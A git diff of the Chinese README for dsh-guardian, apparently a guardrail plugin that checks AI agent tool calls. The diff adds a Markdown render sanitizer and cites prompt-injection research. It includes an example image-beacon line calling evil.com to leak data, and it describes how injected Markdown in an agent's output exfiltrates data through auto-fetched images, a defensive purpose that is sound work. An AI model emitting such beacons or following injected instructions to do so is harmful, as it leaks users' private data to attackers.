@@ -28,6 +28,7 @@ Agent 想执行工具 → guardian/check 前置审查 → 命中规则 → 拦�
 外加：
 
 - **路径沙箱**（`guardian/path`）：realpath 解析 + 白名单根目录 + 编码变体解码 + 空字节截断检测——比纯正则可靠
+- **渲染层外泄引擎**（`guardian/render`）：Agent 输出的 Markdown 本身就是外泄信道——图片信标 `![](https://evil.com/p?d=<数据>)` 让前端渲染器自动 fetch 外传（CVE-2026-22551 Eclipse Theia / Claude 图片外泄 / Copilot·Gemini Markdown Injection 同类攻击），检测 + 净化（信标移除、欺骗链接显真、危险 HTML 剥除），代码块豁免防误报
 - **风险评分引擎**（`risk.ts`）：多信号并集概率式加权成 0~1 分，按阈值分级处置（deny/block/warn/allow）
 
 ## 🚦 三级处置
@@ -70,7 +71,11 @@ if (r && r.intercepted) throw new Error(`已拦截：${r.reason}`)
 const v = ctx.bail('guardian/path', filePath)
 if (v && v.safe === false) throw new Error(`路径被拦截：${v.reason}`)
 
-// ④ 查审计日志
+// ④ 渲染 Agent 输出前校验（图片信标 / 链接欺骗 / 危险 HTML）
+const r = ctx.bail('guardian/render', markdown)
+if (r && r.safe === false) render(r.sanitized)   // 用净化版渲染，勿渲染原文
+
+// ⑤ 查审计日志
 console.log(ctx.guardian.readAudit(20))
 ```
 
@@ -86,7 +91,7 @@ console.log(ctx.guardian.readAudit(20))
 ## 🧪 测试
 
 ```bash
-npm ci && npm test     # 19/19 通过
+npm ci && npm test     # 57/57 通过
 ```
 
 ## 🙏 致谢 / 参考
@@ -100,6 +105,10 @@ npm ci && npm test     # 19/19 通过
 - [deadbits/vigil-llm](https://github.com/deadbits/vigil-llm) — 提示注入签名
 - [SyedAnas01/mcp-safeguard](https://github.com/SyedAnas01/mcp-safeguard) — TP/PI/SSRF/CRED 规则分类法
 - [SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) — 危险命令检测规则
+- [DOMPurify](https://github.com/cure53/DOMPurify) — 渲染层净化哲学（dsh-guardian 的 sanitize 为其 Markdown 确定性子集）
+- [Checkmarx Markdown Injection 研究](https://checkmarx.com/zero-post/exploiting-markdown-injection-in-ai-agents-microsoft-copilot-chat-and-google-gemini/) — Copilot/Gemini 渲染注入攻击类
+- [embracethered.com](https://embracethered.com/blog/) — Claude 图片 URL 外泄 PoC 与间接注入攻击链披露
+- [GHSA-qwjm-9c66-w4q4](https://github.com/advisories/ghsa-qwjm-9c66-w4q4)（CVE-2026-22551）— Eclipse Theia AI Chat Markdown 图片渲染外泄
 
 > ⚠️ **安全认知**：所有正则/启发式护栏都可能被绕过（对抗样本实测可绕过多种护栏）。本插件是 **risk reducer**，关键操作仍需**人在环确认 + 最小权限沙箱**，不能替代这两者。
 
